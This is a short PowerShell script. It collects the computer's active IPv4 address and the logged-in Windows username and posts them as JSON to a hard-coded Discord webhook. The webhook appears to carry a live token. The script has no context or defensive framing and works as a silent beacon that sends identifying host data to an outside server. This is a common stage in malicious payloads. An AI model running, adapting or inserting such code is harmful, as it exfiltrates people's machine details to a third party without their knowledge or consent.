$ip = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
$name = "$env:UserName"

$online = @"
$ip , $name
"@
$payload = [PSCustomObject]@{
    content = $online
}

$link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"

Invoke-RestMethod -ContentType 'Application/Json' -Uri $link -Method Post -Body ($payload | ConvertTo-Json)